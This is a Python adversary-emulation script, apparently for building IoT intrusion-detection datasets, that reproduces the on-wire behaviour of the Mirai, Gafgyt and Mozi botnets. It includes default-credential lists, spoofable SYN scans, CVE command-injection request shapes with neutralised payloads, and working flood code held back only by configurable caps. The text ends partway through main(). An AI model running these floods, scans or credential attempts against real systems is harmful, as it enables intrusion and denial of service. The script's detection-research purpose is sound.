#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "scapy>=2.5",
#     "paho-mqtt>=1.6",
# ]
# ///
# ^ PEP 723 inline metadata: `uv run iot_family_profiles.py ...` builds a cached
#   environment from this automatically -- no pip, no venv, no activate.
"""
iot_family_profiles.py  --  family-specific IoT-botnet behaviour profiles
==========================================================================

A companion to `iot_botnet_emulator.py`. Where the emulator stages a *generic*
botnet kill-chain, this generator reproduces the DISTINCT on-the-wire behaviour
of three specific IoT-malware families, each labelled by name, so the dataset
supports MULTI-CLASS (per-family) detection -- the way the real public captures
(IoT-23, N-BaIoT, Bot-IoT) are labelled -- not just binary benign/malicious.

Why per-family profiles matter (the academic point)
----------------------------------------------------
The three families look genuinely different on the wire, and a gateway detector
should be able to tell them apart:

  * MIRAI   -- Telnet brute-force on 23/2323 using its canonical hard-coded
               credential list; report -> loader -> central C2 over raw TCP with
               a small FIXED-SIZE, low-jitter heartbeat; a broad menu of flood
               vectors (SYN/ACK/UDP/DNS/GRE/HTTP).
  * GAFGYT  -- raw-TCP C2 carrying PLAINTEXT command tokens (PING/PONG, SCANNER,
               TCP/UDP/HTTP/HOLD/JUNK/KILLATTK); spreads by probing known
               router/DVR command-injection CVEs rather than only Telnet.
  * MOZI    -- NO central C2: a peer-to-peer mesh built on the BitTorrent DHT
               (bencoded UDP ping/find_node), config pulled peer-to-peer; spreads
               via the same exploit-probe CVEs plus weak Telnet.

------------------------------------------------------------------------------
SCOPE AND SAFETY  (identical discipline to the emulator -- read before citing)
------------------------------------------------------------------------------
This is ADVERSARY EMULATION, not malware. By deliberate design it:
  * carries NO real botnet binary and drops NO payload onto any device,
  * installs NO persistence and performs NO self-replication,
  * NEVER evaluates a login response for success and NEVER escalates -- the
    credential phase only EMITS the documented default-login attempt traffic,
  * sends only benign, read-only BusyBox strings as the loader fingerprint,
  * emits exploit-probe traffic with the REAL request structure an IDS matches
    (method, URI, SOAPAction, the injection parameter) but with the command
    payload NEUTRALISED to an inert marker -- signature fidelity, zero working
    exploit, against lab devices that are not vulnerable anyway,
  * rate-caps and time-bounds every flood (short bursts, pps/connection ceiling)
    -- there is no line-rate / unbounded flood mode,
  * reaches the DHT only within the lab (peers = lab hosts); the real public
    bootstrap nodes are contacted only if explicitly egress-allowlisted.
Because detection is purely network-level at the gateway, the SOURCE of the
traffic does not affect signature validity -- so reproducing the behaviour is
methodologically equivalent to, and far safer than, running the live families.

Every target is asserted inside LAB_NET (or the explicit egress allowlist);
anything else aborts the run. Run only on an isolated lab you own and may test.

------------------------------------------------------------------------------
USAGE
------------------------------------------------------------------------------
  uv run iot_family_profiles.py describe                 # per-family catalogue
  uv run iot_family_profiles.py deps                     # tool availability
  uv run iot_family_profiles.py run mirai                # DRY-RUN (prints plan)
  sudo uv run iot_family_profiles.py run mirai --fire    # raw-socket phases need root
  uv run iot_family_profiles.py run gafgyt --phases exploit,c2 --fire
  uv run iot_family_profiles.py run mozi --fire

Dry-run is the default: nothing is sent without --fire. sudo is needed only for
the raw-socket phases (scapy scan and the DoS bursts).
"""
from __future__ import annotations

import argparse
import os
import random
import socket
import subprocess
import sys

import testbed_lib as tl
from testbed_lib import C

# =============================================================================
# CONFIG  --  EDIT TO MATCH YOUR TESTBED (keep in step with iot_botnet_emulator.py;
# a shared YAML config is the planned M6 consolidation)
# =============================================================================
LAB_NET = "192.168.50.0/24"
ALLOW_NONPRIVATE = False

# One self-owned C2/peer endpoint MAY live outside the lab (PROJECT.md s5).
# Put its IP or hostname here to permit egress to exactly that host; empty =
# everything stays locked inside LAB_NET.
EGRESS_ALLOW: tuple[str, ...] = ()

GATEWAY = "192.168.50.1"            # Raspberry Pi: router / DNS / MQTT broker

# simulated C2 / loader / peer, on a SEPARATE host from the gateway
SIM_C2 = "192.168.50.60"
C2_HTTP_PORT = 80                   # register / gate.php / config pull
C2_TCP_PORT = 4444                  # raw-TCP C2 (mirai heartbeat, gafgyt tokens)

DEVICES = {
    "esp32_sensor": "192.168.50.15",
    "smart_bulb":   "192.168.50.20",
    "smart_plug":   "192.168.50.25",
    "mqtt_client":  "192.168.50.50",
}
VICTIM = DEVICES["mqtt_client"]     # "patient zero"
DDOS_TARGET = DEVICES["smart_bulb"] # a lab device to flood (NEVER the gateway --
                                    # that would drop the capture/C2 path mid-run)

# Mozi DHT: peers stay in the lab for containment. The real public bootstrap
# nodes (router.bittorrent.com:6881, dht.transmissionbt.com:6881, etc.) are
# contacted ONLY if added to EGRESS_ALLOW above.
DHT_PEERS = [SIM_C2, GATEWAY] + [ip for ip in DEVICES.values()]
DHT_PORT = 6881

# ---- timing / bounds (seconds; mirror the emulator's caps) ------------------
BASELINE_GAP      = 30
PHASE_SPACING     = (2, 5)
BEACON_INTERVAL   = 30              # mean C2/DHT heartbeat period
BEACON_JITTER     = 3
BEACON_WINDOW     = 300             # total beaconing duration
ACCESS_DELAY      = 0.3            # gap between telnet credential attempts
DOS_BURST_SECONDS = 8              # length of EACH flood burst (kept short)
DOS_BURST_PPS_CAP = 2500           # packets/sec ceiling per burst (bounded)
HTTP_FLOOD_CAP    = 1500           # max requests in an HTTP-flood burst
HOLD_CONN_CAP     = 200            # max concurrent sockets in a HOLD burst

OUT_DIR = "runs"
RUN_SEED = 718

# Inert marker substituted for every exploit command payload. Preserves the
# injection-point STRUCTURE (what signatures match) while being a shell no-op.
NEUTRALISED_CMD = ":;# NEUTRALISED-TESTBED-MARKER"

# =============================================================================
# Family artefacts (documented, public -- the signatures a NIDS matches).
# Emitted as inert attempt-traffic / benign strings only.
# =============================================================================

# Canonical Mirai default-credential list (scanner.c). Inert attempt traffic.
MIRAI_CREDS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), ("admin", "admin"),
    ("root", "888888"), ("root", "xmhdipc"), ("root", "default"), ("root", "juantech"),
    ("root", "123456"), ("root", "54321"), ("support", "support"), ("root", ""),
    ("admin", "password"), ("root", "root"), ("root", "12345"), ("user", "user"),
    ("admin", "smcadmin"), ("root", "pass"), ("admin", "admin1234"), ("root", "1111"),
    ("admin", "1234"), ("root", "666666"), ("root", "password"), ("root", "1234"),
    ("root", "klv123"), ("Administrator", "admin"), ("service", "service"),
    ("guest", "guest"), ("guest", "12345"), ("root", "zlxx."), ("root", "7ujMko0admin"),
    ("root", "system"), ("root", "ikwb"), ("root", "dreambox"), ("root", "realtek"),
    ("admin", "1111111"), ("admin", "meinsm"), ("root", "7ujMko0vizxv"),
]

# Gafgyt/BASHLITE credential list -- overlaps Mirai but adds its own.
GAFGYT_CREDS = [
    ("root", "root"), ("admin", "admin"), ("root", "vizxv"), ("root", "xc3511"),
    ("root", "admin"), ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
    ("root", "default"), ("root", "juantech"), ("telnet", "telnet"), ("root", "1234"),
    ("admin", "password"), ("root", "888888"), ("supervisor", "supervisor"),
    ("root", "anko"), ("admin", ""), ("root", "hi3518"), ("root", "7ujMko0admin"),
]

# Benign, read-only BusyBox fingerprint (no exec follow-up, no file write).
BUSYBOX_FINGERPRINT = [
    "/bin/busybox MIRAI", "/bin/busybox ps", "/bin/busybox cat /proc/mounts",
    "/bin/busybox cat /proc/cpuinfo", "/bin/busybox uname -a", "/bin/busybox ECCHI",
]

# Known router/DVR command-injection CVEs used by Gafgyt & Mozi to spread.
# The command payload is NEUTRALISED (see NEUTRALISED_CMD); only the request
# STRUCTURE -- method, path, SOAPAction, injection parameter -- is real, which
# is what an IDS signature keys on. Ports are where the service typically lives.
EXPLOIT_PROBES = [
    {
        "name": "huawei-hg532-cve-2017-17215", "attck": "T1190",
        "method": "POST", "port": 37215, "path": "/ctrlt/DeviceUpgrade_1",
        "headers": {"Content-Type": "text/xml",
                    "SOAPAction": "urn:schemas-upnp-org:service:WANPPPConnection:1#GetStatusInfo"},
        "body": ("<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                 "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">"
                 "<NewStatusURL>{cmd}</NewStatusURL><NewDownloadURL>{cmd}</NewDownloadURL>"
                 "</u:Upgrade></s:Body></s:Envelope>"),
    },
    {
        "name": "realtek-sdk-cve-2014-8361", "attck": "T1190",
        "method": "POST", "port": 52869, "path": "/picsdesc.xml",
        "headers": {"Content-Type": "text/xml",
                    "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"},
        "body": ("<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                 "<s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
                 "<NewInternalClient>{cmd}</NewInternalClient></u:AddPortMapping></s:Body></s:Envelope>"),
    },
    {
        "name": "gpon-home-gateway-cve-2018-10561", "attck": "T1190",
        "method": "POST", "port": 80, "path": "/GponForm/diag_Form?images/",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "body": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`{cmd}`&ipv=0",
    },
    {
        "name": "jaws-dvr-webserver-rce", "attck": "T1190",
        "method": "GET", "port": 60001, "path": "/shell?{cmd}",
        "headers": {}, "body": None,
    },
    {
        "name": "dlink-hnap-soapaction-rce", "attck": "T1190",
        "method": "POST", "port": 80, "path": "/HNAP1/",
        "headers": {"SOAPAction": "http://purenetworks.com/HNAP1/`{cmd}`"},
        "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope/>",
    },
]

# Gafgyt plaintext C2 command vocabulary (recorded as metadata; the flood phase
# maps a vector onto one of these tokens).
GAFGYT_TOKENS = ["PING", "PONG", "SCANNER ON", "SCANNER OFF", "TCP", "UDP",
                 "HTTP", "HOLD", "JUNK", "KILLATTK", "LOLNOGTFO"]

# Per-family profiles: scan ports, creds, C2 style, DDoS vectors, default chain.
FAMILIES = {
    "mirai": {
        "scan_ports": [23, 2323],
        "creds": MIRAI_CREDS,
        "c2_style": "mirai-fixed-heartbeat",
        "ddos_vectors": ["syn", "ack", "udp", "dns", "gre", "http"],
        "chain": ["recon", "access", "loader", "register", "c2", "ddos"],
    },
    "gafgyt": {
        "scan_ports": [23, 2323, 80, 37215, 52869],
        "creds": GAFGYT_CREDS,
        "c2_style": "gafgyt-plaintext-tokens",
        "ddos_vectors": ["syn", "udp", "http", "hold", "junk"],
        "chain": ["recon", "access", "exploit", "register", "c2", "ddos"],
    },
    "mozi": {
        "scan_ports": [23, 2323, 80, 37215, 52869, 60001],
        "creds": GAFGYT_CREDS,  # Mozi borrows Gafgyt's weak-telnet list
        "c2_style": "mozi-dht-p2p",
        "ddos_vectors": ["syn", "udp", "http"],
        "chain": ["exploit", "dht_join", "config_pull", "dht_beacon", "ddos"],
    },
}

# =============================================================================
# Optional deps
# =============================================================================
def _imp(mod_path):
    try:
        import importlib
        return importlib.import_module(mod_path)
    except Exception:
        return None


SCAPY = _imp("scapy.all")
MQTT = _imp("paho.mqtt.client")


# =============================================================================
# Low-level senders (benign structure; nothing is read/acted upon)
# =============================================================================
def _http_request(host, port, method, path, headers=None, body=None):
    headers = dict(headers or {})
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(4)
            s.connect((host, port))
            lines = [f"{method} {path} HTTP/1.1", f"Host: {host}",
                     "User-Agent: Hello-World", "Connection: close"]
            body_b = body.encode() if isinstance(body, str) else (body or b"")
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
            if body_b:
                lines.append(f"Content-Length: {len(body_b)}")
            req = ("\r\n".join(lines) + "\r\n\r\n").encode() + body_b
            s.sendall(req)
            try:
                s.recv(256)
            except Exception:
                pass
    except Exception:
        pass


def _raw_send(host, port, payload: bytes, tcp: bool):
    try:
        fam = socket.SOCK_STREAM if tcp else socket.SOCK_DGRAM
        with socket.socket(socket.AF_INET, fam) as s:
            s.settimeout(2)
            if tcp:
                s.connect((host, port))
                s.sendall(payload)
            else:
                s.sendto(payload, (host, port))
    except Exception:
        pass


def _telnet_lines(host, lines, delay):
    """Open :23 and emit lines (creds or busybox strings). Never reads/evaluates
    the response -- signature emission, not interaction."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((host, 23))
            try:
                s.recv(256)                 # consume banner
            except Exception:
                pass
            for ln in lines:
                if tl.stopped():
                    break
                s.sendall((ln + "\r\n").encode())
                tl.sleep(delay)
    except Exception:
        pass                                # refused etc. is still a logged attempt


def _spoof_src_of(ctx) -> str | None:
    return ctx.config_snapshot.get("spoof_src")


# =============================================================================
# Phases -- family-aware. The active profile is read from ctx.config_snapshot.
# =============================================================================
def _profile(ctx) -> dict:
    return FAMILIES[ctx.family]


def ph_recon(ctx):
    """Reconnaissance: SYN sweep for the ports this family targets."""
    prof = _profile(ctx)
    ports = prof["scan_ports"]
    tl.banner(f"{ctx.family} / recon -- SYN sweep ports {ports}")
    ctx.boundary.assert_targets(LAB_NET)
    with ctx.phase("recon", "tcp-syn-sweep", "T1595 / T1046", LAB_NET) as x:
        x["ports"] = ports
        pstr = ",".join(map(str, ports))
        if tl.have("nmap") and not _spoof_src_of(ctx):
            cmd = ["nmap", "-sS", "-Pn", "-n", "-T4", "--open", "-p", pstr, LAB_NET]
            tl.info(f"  $ {' '.join(cmd)}")
            if ctx.fire:
                subprocess.run(cmd, check=False)
        else:
            _scapy_syn_sweep(ctx, ports, x)


def _scapy_syn_sweep(ctx, ports, x):
    if not SCAPY:
        tl.info("  scapy missing -- skipping scan (pip install scapy)", C.Y)
        return
    import ipaddress
    hosts = list(ipaddress.ip_network(LAB_NET, strict=False).hosts())
    spoof = _spoof_src_of(ctx)
    tl.info(f"  scapy SYN sweep: {len(hosts)} hosts x {len(ports)} ports"
            + (f"  spoofed src={spoof}" if spoof else ""))
    if not ctx.fire:
        return
    opened, sent = [], 0
    for h in hosts:
        if tl.stopped():
            break
        for p in ports:
            if tl.stopped():
                break
            ip = SCAPY.IP(dst=str(h))
            if spoof:
                ip.src = spoof
            resp = SCAPY.sr1(ip / SCAPY.TCP(sport=SCAPY.RandShort(), dport=p, flags="S"),
                             timeout=0.3, verbose=0)
            sent += 1
            if resp and resp.haslayer(SCAPY.TCP) and resp[SCAPY.TCP].flags == 0x12:
                opened.append(f"{h}:{p}")
                tl.info(f"    open: {h}:{p}", C.G)
                if not spoof:
                    SCAPY.send(SCAPY.IP(dst=str(h)) / SCAPY.TCP(
                        sport=resp[SCAPY.TCP].dport, dport=p, flags="R"), verbose=0)
    x["probes_sent"] = sent
    x["open_ports"] = opened


def ph_access(ctx):
    """Credential-attempt traffic: this family's default-login byte sequences
    against the victim's telnet (INERT -- emits attempts only)."""
    prof = _profile(ctx)
    creds = prof["creds"]
    tl.banner(f"{ctx.family} / access -- {len(creds)} default-cred attempts (inert)")
    ctx.boundary.assert_targets(VICTIM)
    with ctx.phase("access", "telnet-default-cred-attempts",
                   "T1110.001 / T1078.001", VICTIM) as x:
        x["creds_emitted"] = len(creds)
        tl.info(f"  emitting {len(creds)} attempts to {VICTIM}:23")
        for u, p in creds:
            print(f"    {C.DIM}telnet<< {u} / {p}{C.END}")
        if not ctx.fire:
            return
        for u, p in creds:
            if tl.stopped():
                break
            _telnet_lines(VICTIM, [u, p], 0.15)
            tl.sleep(ACCESS_DELAY)


def ph_loader(ctx):
    """Loader fingerprint (Mirai): benign read-only BusyBox strings on the wire
    plus a harmless marker pull from the sim-C2 done BY THIS BOX."""
    tl.banner(f"{ctx.family} / loader -- BusyBox fingerprint + marker pull")
    ctx.boundary.assert_targets(VICTIM, SIM_C2)
    url = f"/bins/marker.txt"
    with ctx.phase("loader", "busybox-fingerprint+marker-pull", "T1059 / T1105",
                   f"{VICTIM} + {SIM_C2}") as x:
        x["fingerprint_lines"] = len(BUSYBOX_FINGERPRINT)
        x["marker_url"] = f"http://{SIM_C2}:{C2_HTTP_PORT}{url}"
        for ln in BUSYBOX_FINGERPRINT:
            print(f"    {C.DIM}telnet<< {ln}{C.END}")
        tl.info(f"  marker pull (this box -> C2): {x['marker_url']}")
        if not ctx.fire:
            return
        _telnet_lines(VICTIM, BUSYBOX_FINGERPRINT, 0.2)
        _http_request(SIM_C2, C2_HTTP_PORT, "GET", url)


def ph_exploit(ctx):
    """Exploit-probe spreading (Gafgyt/Mozi): emit the known router/DVR
    command-injection request STRUCTURES with a NEUTRALISED payload against lab
    devices (which are not vulnerable). Pure signature, no working exploit."""
    tl.banner(f"{ctx.family} / exploit -- {len(EXPLOIT_PROBES)} CVE probe shapes (neutralised)")
    targets = [ip for ip in DEVICES.values() if ip != VICTIM] or [VICTIM]
    ctx.boundary.assert_targets(*targets)
    with ctx.phase("exploit", "cve-command-injection-probe (neutralised)",
                   "T1190 / T1210", ",".join(targets)) as x:
        x["probes"] = [p["name"] for p in EXPLOIT_PROBES]
        x["payload"] = "neutralised (structure only)"
        for probe in EXPLOIT_PROBES:
            path = probe["path"].replace("{cmd}", NEUTRALISED_CMD)
            tl.info(f"  {probe['method']} :{probe['port']}{path.split('?')[0]}  "
                    f"[{probe['name']}]")
        if not ctx.fire:
            return
        for ip in targets:
            if tl.stopped():
                break
            for probe in EXPLOIT_PROBES:
                if tl.stopped():
                    break
                path = probe["path"].replace("{cmd}", NEUTRALISED_CMD)
                headers = {k: v.replace("{cmd}", NEUTRALISED_CMD)
                           for k, v in probe["headers"].items()}
                body = probe["body"].replace("{cmd}", NEUTRALISED_CMD) if probe["body"] else None
                _http_request(ip, probe["port"], probe["method"], path, headers, body)
                tl.sleep(0.2)


def ph_register(ctx):
    """First check-in. Mirai: HTTP report to the scanlisten/loader. Gafgyt:
    plaintext BUILD announce over the raw-TCP C2."""
    tl.banner(f"{ctx.family} / register -- first check-in")
    ctx.boundary.assert_targets(SIM_C2)
    with ctx.phase("register", "c2-first-checkin", "T1071.001", SIM_C2) as x:
        if ctx.family == "gafgyt":
            announce = f"BUILD {ctx.family}\nP{os.getpid()}\n"
            x["announce"] = announce.replace("\n", "\\n")
            tl.info(f"  TCP {SIM_C2}:{C2_TCP_PORT} <- {x['announce']}")
            if ctx.fire:
                _raw_send(SIM_C2, C2_TCP_PORT, announce.encode(), tcp=True)
        else:
            path = f"/register?id={VICTIM}&arch=arm&ver=1&fam={ctx.family}"
            x["path"] = path
            tl.info(f"  GET http://{SIM_C2}:{C2_HTTP_PORT}{path}")
            if ctx.fire:
                _http_request(SIM_C2, C2_HTTP_PORT, "GET", path)


def ph_c2(ctx):
    """Beaconing, in this family's C2 style:
       mirai  -- raw-TCP small FIXED-SIZE heartbeat (the rhythm is the signature),
       gafgyt -- raw-TCP plaintext PING/PONG token chatter."""
    prof = _profile(ctx)
    style = prof["c2_style"]
    tl.banner(f"{ctx.family} / c2 -- {style} (~{BEACON_INTERVAL}+/-{BEACON_JITTER}s "
              f"for {BEACON_WINDOW}s)")
    ctx.boundary.assert_targets(SIM_C2)
    with ctx.phase("c2", style, "T1071 / T1571 / T1008", SIM_C2) as x:
        x["interval_s"] = f"{BEACON_INTERVAL}+/-{BEACON_JITTER}"
        if ctx.family == "gafgyt":
            x["vocab"] = GAFGYT_TOKENS
            tl.info(f"  TCP {SIM_C2}:{C2_TCP_PORT} plaintext PING/PONG tokens")
        else:
            tl.info(f"  TCP {SIM_C2}:{C2_TCP_PORT} 4-byte fixed heartbeat")
        if not ctx.fire:
            return
        x["beacons"] = _beacon_loop(ctx)


def _beacon_loop(ctx) -> int:
    import time as _t
    end, n = _t.time() + BEACON_WINDOW, 0
    while _t.time() < end and not tl.stopped():
        n += 1
        if ctx.family == "gafgyt":
            _raw_send(SIM_C2, C2_TCP_PORT, b"PING\n", tcp=True)   # client keepalive
        else:
            _raw_send(SIM_C2, C2_TCP_PORT, b"\x00\x00\x00\x00", tcp=True)  # fixed heartbeat
        tl.info(f"    beacon #{n}")
        tl.sleep(max(1, BEACON_INTERVAL + random.uniform(-BEACON_JITTER, BEACON_JITTER)))
    return n


# ---- Mozi P2P (BitTorrent DHT) ----------------------------------------------
def _bencode_dht(query: str, node_id: bytes, target: bytes = b"") -> bytes:
    """Minimal bencoded BitTorrent-DHT query (ping / find_node) -- the Mozi mesh
    signature. Mozi node IDs carry a recognisable config-derived prefix; we embed
    a lab marker prefix so the family is identifiable in capture, not a real one."""
    tid = bytes(random.getrandbits(8) for _ in range(2))
    if query == "ping":
        args = b"d2:id20:" + node_id + b"e"
        return b"d1:a" + args + b"1:q4:ping1:t2:" + tid + b"1:y1:qe"
    # find_node
    args = b"d2:id20:" + node_id + b"6:target20:" + target + b"e"
    return b"d1:a" + args + b"1:q9:find_node1:t2:" + tid + b"1:y1:qe"


def _mozi_node_id() -> bytes:
    # Lab marker prefix ("TB" = testbed) + random, so Mozi-style DHT traffic is
    # recognisable in the capture without impersonating a real botnet config hash.
    return b"TB" + bytes(random.getrandbits(8) for _ in range(18))


def ph_dht_join(ctx):
    """Mozi: join the P2P mesh -- bencoded DHT find_node queries to peers."""
    tl.banner(f"{ctx.family} / dht_join -- BitTorrent-DHT find_node to {len(DHT_PEERS)} peers")
    ctx.boundary.assert_targets(*DHT_PEERS)
    with ctx.phase("dht_join", "bittorrent-dht-find_node", "T1090 / T1095",
                   ",".join(DHT_PEERS)) as x:
        x["peers"] = DHT_PEERS
        x["dht_port"] = DHT_PORT
        tl.info(f"  UDP :{DHT_PORT} bencoded find_node to peers")
        if not ctx.fire:
            return
        nid = _mozi_node_id()
        sent = 0
        for peer in DHT_PEERS:
            if tl.stopped():
                break
            _raw_send(peer, DHT_PORT, _bencode_dht("find_node", nid, _mozi_node_id()), tcp=False)
            sent += 1
            tl.sleep(0.2)
        x["queries"] = sent


def ph_config_pull(ctx):
    """Mozi: pull the config/payload blob peer-to-peer (HTTP GET from a peer)."""
    tl.banner(f"{ctx.family} / config_pull -- peer HTTP config fetch")
    ctx.boundary.assert_targets(SIM_C2)
    path = "/bins/config.bin"
    with ctx.phase("config_pull", "p2p-config-fetch", "T1105", SIM_C2) as x:
        x["url"] = f"http://{SIM_C2}:{C2_HTTP_PORT}{path}"
        tl.info(f"  GET {x['url']}")
        if ctx.fire:
            _http_request(SIM_C2, C2_HTTP_PORT, "GET", path)


def ph_dht_beacon(ctx):
    """Mozi: steady-state DHT ping chatter across the mesh (the P2P heartbeat)."""
    import time as _t
    tl.banner(f"{ctx.family} / dht_beacon -- DHT ping chatter ({BEACON_WINDOW}s)")
    ctx.boundary.assert_targets(*DHT_PEERS)
    with ctx.phase("dht_beacon", "bittorrent-dht-ping-mesh", "T1090 / T1008",
                   ",".join(DHT_PEERS)) as x:
        x["dht_port"] = DHT_PORT
        tl.info(f"  UDP :{DHT_PORT} periodic ping to peers")
        if not ctx.fire:
            return
        nid = _mozi_node_id()
        end, n = _t.time() + BEACON_WINDOW, 0
        while _t.time() < end and not tl.stopped():
            for peer in DHT_PEERS:
                if tl.stopped():
                    break
                _raw_send(peer, DHT_PORT, _bencode_dht("ping", nid), tcp=False)
                n += 1
            tl.info(f"    dht ping round, total {n}")
            tl.sleep(max(1, BEACON_INTERVAL + random.uniform(-BEACON_JITTER, BEACON_JITTER)))
        x["pings"] = n


def ph_ddos(ctx):
    """DDoS participation: this family's flood vectors, each short and rate/
    connection-capped (anomaly samples, not an outage), at a lab target."""
    prof = _profile(ctx)
    vectors = prof["ddos_vectors"]
    tl.banner(f"{ctx.family} / ddos -- vectors {vectors} "
              f"({DOS_BURST_SECONDS}s each, <= {DOS_BURST_PPS_CAP} pps)")
    ctx.boundary.assert_targets(DDOS_TARGET)
    with ctx.phase("ddos", f"flood:{'+'.join(vectors)}-capped", "T1498 / T1499",
                   DDOS_TARGET) as x:
        x["vectors"] = vectors
        x["burst_s"] = DOS_BURST_SECONDS
        x["pps_cap"] = DOS_BURST_PPS_CAP
        if not ctx.fire:
            tl.info(f"  would send bounded bursts: {', '.join(vectors)}")
            return
        totals = {}
        for v in vectors:
            if tl.stopped():
                break
            totals[v] = _dos_burst(ctx, v)
            tl.sleep(3)
        x["packets"] = totals


def _dos_burst(ctx, vector: str) -> int:
    """One bounded flood burst. Raw vectors use scapy; app-layer vectors
    (http/hold/junk) use sockets. All are time- and rate/connection-capped."""
    import time as _t
    tl.info(f"    burst: {vector}")
    end = _t.time() + DOS_BURST_SECONDS
    spoof = _spoof_src_of(ctx)

    if vector in ("http", "hold", "junk"):
        return _dos_app_layer(ctx, vector, end)

    if not SCAPY:
        tl.info("      scapy missing -- skipping raw vector", C.Y)
        return 0
    interval = 1.0 / DOS_BURST_PPS_CAP
    count = 0
    while _t.time() < end and not tl.stopped():
        ip = SCAPY.IP(dst=DDOS_TARGET)
        if spoof:
            ip.src = spoof
        if vector == "syn":
            pkt = ip / SCAPY.TCP(sport=SCAPY.RandShort(),
                                 dport=random.choice([80, 23, 1883]), flags="S")
        elif vector == "ack":
            pkt = ip / SCAPY.TCP(sport=SCAPY.RandShort(),
                                 dport=random.choice([80, 23, 1883]), flags="A")
        elif vector == "udp":
            pkt = ip / SCAPY.UDP(sport=SCAPY.RandShort(),
                                 dport=random.choice([5683, 53, 123])) / (b"x" * 32)
        elif vector == "dns":
            pkt = ip / SCAPY.UDP(sport=SCAPY.RandShort(), dport=53) / \
                SCAPY.DNS(rd=1, qd=SCAPY.DNSQR(qname="lab.example.", qtype="ANY"))
        elif vector == "gre":
            pkt = ip / SCAPY.GRE() / SCAPY.IP(dst=DDOS_TARGET) / (b"x" * 32)
        else:  # icmp
            pkt = ip / SCAPY.ICMP()
        try:
            SCAPY.send(pkt, verbose=0)
            count += 1
        except Exception:
            break
        _t.sleep(interval)
    tl.info(f"      {count} packets in {DOS_BURST_SECONDS}s")
    return count


def _dos_app_layer(ctx, vector: str, end: float) -> int:
    """Gafgyt-style app-layer floods: HTTP GET flood, HOLD (keep sockets open),
    JUNK (send garbage). Bounded by time, request count and socket count."""
    import time as _t
    count = 0
    if vector == "hold":
        socks = []
        try:
            while _t.time() < end and not tl.stopped() and len(socks) < HOLD_CONN_CAP:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((DDOS_TARGET, 80))
                    socks.append(s)
                    count += 1
                except Exception:
                    break
                _t.sleep(0.02)
            tl.sleep(min(3, max(0, end - _t.time())))   # hold them briefly
        finally:
            for s in socks:
                try:
                    s.close()
                except Exception:
                    pass
        tl.info(f"      held {count} connections")
        return count
    # http / junk: connect, send, close, repeat (capped)
    while _t.time() < end and not tl.stopped() and count < HTTP_FLOOD_CAP:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((DDOS_TARGET, 80))
                if vector == "http":
                    s.sendall(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n"
                              f"Host: {DDOS_TARGET}\r\nConnection: close\r\n\r\n".encode())
                else:  # junk
                    s.sendall(bytes(random.getrandbits(8) for _ in range(256)))
            count += 1
        except Exception:
            break
        _t.sleep(0.01)
    tl.info(f"      {vector}: {count} requests")
    return count


# =============================================================================
# Phase registry + scenarios
# =============================================================================
PHASES = {
    "recon": ph_recon, "access": ph_access, "loader": ph_loader,
    "exploit": ph_exploit, "register": ph_register, "c2": ph_c2,
    "dht_join": ph_dht_join, "config_pull": ph_config_pull,
    "dht_beacon": ph_dht_beacon, "ddos": ph_ddos,
}


# =============================================================================
# CLI
# =============================================================================
def cmd_describe():
    print(f"{C.BOLD}IoT family behaviour profiles -- catalogue{C.END}\n")
    for fam, prof in FAMILIES.items():
        print(f"  {C.G}{C.BOLD}{fam}{C.END}  ({prof['c2_style']})")
        print(f"    chain : {' -> '.join(prof['chain'])}")
        print(f"    ports : {prof['scan_ports']}")
        print(f"    ddos  : {prof['ddos_vectors']}")
        print(f"    creds : {len(prof['creds'])} default-login pairs (inert attempt traffic)\n")
    print(f"{C.BOLD}Phases{C.END}")
    for k, fn in PHASES.items():
        doc = (fn.__doc__ or "").strip().split("\n")[0]
        print(f"  {C.G}{k:<13}{C.END} {doc}")
    print(f"\n{C.DIM}All inert emulation: no real malware, no escalation, no remote "
          f"execution, neutralised exploit payloads, bounded floods. Dry-run by "
          f"default; add --fire to execute.{C.END}")


def cmd_deps():
    print("Tool / module availability (install on the attacker box as needed):")
    for t, pkg in [("nmap", "nmap"), ("curl", "curl"), ("dig", "dnsutils")]:
        ok = tl.have(t)
        print(f"  {C.G}OK{C.END} {t:<12}" if ok else f"  {C.R}--{C.END} {t:<12}", f"({pkg})")
    for m, pip in [(SCAPY, "scapy"), (MQTT, "paho-mqtt")]:
        print(f"  {C.G}OK{C.END} py:{pip:<10}" if m else f"  {C.R}--{C.END} py:{pip:<10}",
              f"(pip install {pip})")


def main():
    ap = argparse.ArgumentParser(description="IoT family behaviour profiles (lab-only).")
    sub = ap.add_subparsers(dest="cmd")
    sub.add_parser("describe")
    sub.add_parser("deps")
    rp = sub.add_parser("run")
    rp.add_argument("family", choices=list(FAMILIES.keys()), help="which family to emulate")
    rp.add_argument("--phases", default=None,
                    help="comma list of phases to run (default: the family's full chain)")
    tl.add_common_run_args(rp)
    a = ap.parse_args()

    if a.cmd == "describe":
        return cmd_describe()
    if a.cmd == "deps":
        return cmd_deps()
    if a.cmd != "run":
        return ap.print_help()

    random.seed(a.seed)
    spoof = a.spoof_src
    boundary = tl.Boundary(lab_net=LAB_NET, egress_allow=EGRESS_ALLOW,
                           allow_nonprivate=ALLOW_NONPRIVATE)
    if spoof:
        boundary.assert_targets(spoof)

    prof = FAMILIES[a.family]
    order = [p.strip() for p in a.phases.split(",")] if a.phases else prof["chain"]
    unknown = [p for p in order if p not in PHASES]
